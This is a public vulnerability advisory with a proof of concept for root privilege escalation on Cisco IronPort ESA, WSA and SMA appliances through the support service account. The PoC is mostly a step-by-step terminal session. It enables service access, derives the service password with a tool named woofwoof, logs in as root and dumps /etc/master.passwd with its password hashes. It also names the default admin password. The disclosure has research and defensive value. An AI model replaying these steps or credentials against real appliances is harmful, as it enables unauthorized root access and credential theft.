Updated for Linux

Cisco Ironport Appliances Privilege Escalation Vulnerability
Vendor: Cisco
Product webpage: http://www.cisco.com
Affected version(s): 
    Cisco Ironport ESA - AsyncOS 8.5.5-280
    Cisco Ironport WSA - AsyncOS 8.0.5-075
    Cisco Ironport SMA - AsyncOS 8.3.6-0
Date: 22/05/2014
Credits: Glafkos Charalambous
CVE: Not assigned by Cisco
 
Disclosure Timeline:
19-05-2014: Vendor Notification
20-05-2014: Vendor Response/Feedback
27-08-2014: Vendor Fix/Patch
24-01-2015: Public Disclosure
 
Description: 
Cisco Ironport appliances are vulnerable to authenticated "admin" privilege escalation.
By enabling the Service Account from the GUI or CLI allows an admin to gain root access on the appliance, therefore bypassing all existing "admin" account limitations.
The vulnerability is due to weak algorithm implementation in the password generation process which is used by Cisco to remotely access the appliance to provide technical support.
 
Vendor Response: 
As anticipated, this is not considered a vulnerability but a security hardening issue. As such we did not assign a CVE however I made sure that this is fixed on SMA, ESA and WSA. The fix included several changes such as protecting better the algorithm in the binary, changing the algorithm itself to be more robust and enforcing password complexity when the administrator set the pass-phrase and enable the account.
 
[SD] Note: Administrative credentials are needed in order to activate the access to support representative and to set up the pass-phrase that it is used to compute the final password.
[GC] Still Admin user has limited permissions on the appliance and credentials can get compromised too, even with default password leading to full root access.
 
[SD] This issue is tracked for the ESA by Cisco bug id: CSCuo96011 for the SMA by Cisco bug id: CSCuo96056 and for WSA by Cisco bug id  CSCuo90528
 
 
Technical Details:
By logging in to the appliance using default password "ironport" or user specified one, there is an option to enable Customer Support Remote Access.
This option can be found under Help and Support -> Remote Access on the GUI or by using the CLI console account "enablediag" and issuing the command service.
Enabling this service requires a temporary user password which should be provided along with the appliance serial number to Cisco techsupport for remotely connecting and authenticating to the appliance. 
 
Having a temporary password and the serial number of the appliance by enabling the service account, an attacker can in turn get full root access as well as potentially damage it, backdoor it, etc.
 
 
PoC:
 
Enable Service Account
----------------------
```
root@kali:~# ssh -lenablediag 192.168.0.158
Password:
Last login: Sat Jan 24 15:47:07 2015 from 192.168.0.163
Copyright (c) 2001-2013, Cisco Systems, Inc.
 
 
AsyncOS 8.5.5 for Cisco C100V build 280
 
Welcome to the Cisco C100V Email Security Virtual Appliance
 
Available Commands:
help -- View this text.
quit -- Log out.
service -- Enable or disable access to the service system.
network -- Perform emergency configuration of the diagnostic network interface.
clearnet -- Resets configuration of the diagnostic network interface.
ssh -- Configure emergency SSH daemon on the diagnostic network interface.
clearssh -- Stop emergency SSH daemon on the diagnostic network interface.
tunnel -- Start up tech support tunnel to IronPort.
print -- Print status of the diagnostic network interface.
reboot -- Reboot the appliance.
 
S/N 564DDFABBD0AD5F7A2E5-2C6019F508A4
Service Access currently disabled.
ironport.example.com> service
 
Service Access is currently disabled.  Enabling this system will allow an
IronPort Customer Support representative to remotely access your system
to assist you in solving your technical issues.  Are you sure you want
to do this?  [Y/N]> Y
 
Enter a temporary password for customer support to use.  This password may
not be the same as your admin password.  This password will not be able
to be used to directly access your system.
[]> cisco123
 
Service access has been ENABLED.  Please provide your temporary password
to your IronPort Customer Support representative.
 
S/N 564DDFABBD0AD5F7A2E5-2C6019F508A4
Service Access currently ENABLED (0 current service logins)
ironport.example.com> 
```
 
Generate Service Account Password
---------------------------------
```
gcc -std=99 -o woofwoof woofwoof.c -lcrypto
./woofwoof
 
Usage: woofwoof.exe -p password -s serial
-p <password> | Cisco Service Temp Password
-s <serial> | Cisco Serial Number
-h | This Help Menu
 
Example: woofwoof.exe -p cisco123 -s 564DDFABBD0AD5F7A2E5-2C6019F508A4
 
./woofwoof -p cisco123 -s 564DDFABBD0AD5F7A2E5-2C6019
F508A4
Service Password: b213c9a4
```
 
Login to the appliance as Service account with root privileges
--------------------------------------------------------------
```
root@kali:~# ssh -lservice 192.168.0.158
Password:
Last login: Wed Dec 17 21:15:24 2014 from 192.168.0.10
Copyright (c) 2001-2013, Cisco Systems, Inc.
 
 
AsyncOS 8.5.5 for Cisco C100V build 280
 
Welcome to the Cisco C100V Email Security Virtual Appliance
# uname -a
FreeBSD ironport.example.com 8.2-RELEASE FreeBSD 8.2-RELEASE #0: Fri Mar 14 08:04:05 PDT 2014     auto-build@vm30esa0109.ibeng:/usr/build/iproot/freebsd/mods/src/sys/amd64/compile/MESSAGING_GATEWAY.amd64  amd64
 
# cat /etc/master.passwd
# $Header: //prod/phoebe-8-5-5-br/sam/freebsd/install/dist/etc/master.passwd#1 $
root:*:0:0::0:0:Mr &:/root:/sbin/nologin
service:$1$bYeV53ke$Q7hVZA5heeb4fC1DN9dsK/:0:0::0:0:Mr &:/root:/bin/sh
enablediag:$1$VvOyFxKd$OF2Cs/W0ZTWuGTtMvT5zc/:999:999::0:0:Administrator support access control:/root:/data/bin/enablediag.sh
adminpassword:$1$aDeitl0/$BlmzKUSeRXoc4kcuGzuSP/:0:1000::0:0:Administrator Password Tool:/data/home/admin:/data/bin/adminpassword.sh
daemon:*:1:1::0:0:Owner of many system processes:/root:/sbin/nologin
operator:*:2:5::0:0:System &:/:/sbin/nologin
bin:*:3:7::0:0:Binaries Commands and Source,,,:/:/sbin/nologin
tty:*:4:65533::0:0:Tty Sandbox:/:/sbin/nologin
kmem:*:5:65533::0:0:KMem Sandbox:/:/sbin/nologin
man:*:9:9::0:0:Mister Man Pages:/usr/share/man:/sbin/nologin
sshd:*:22:22::0:0:Secure Shell Daemon:/var/empty:/sbin/nologin
nobody:*:65534:65534::0:0:Unprivileged user:/nonexistent:/sbin/nologin
support:$1$FgFVb064$SmsZv/ez7Pf4wJLp5830s/:666:666::0:0:Mr &:/root:/sbin/nologin
admin:$1$VvOyFxKd$OF2Cs/W0ZTWuGTtMvT5zc/:1000:1000::0:0:Administrator:/data/home/admin:/data/bin/cli.sh
clustercomm:*:900:1005::0:0:Cluster Communication User:/data/home/clustercomm:/data/bin/command_proxy.sh
smaduser:*:901:1007::0:0:Smad User:/data/home/smaduser:/data/bin/cli.sh
spamd:*:783:1006::0:0:CASE User:/usr/case:/sbin/nologin
pgsql:*:70:70::0:0:PostgreSQL pseudo-user:/usr/local/pgsql:/bin/sh
ldap:*:389:389::0:0:OpenLDAP Server:/nonexistent:/sbin/nologin
```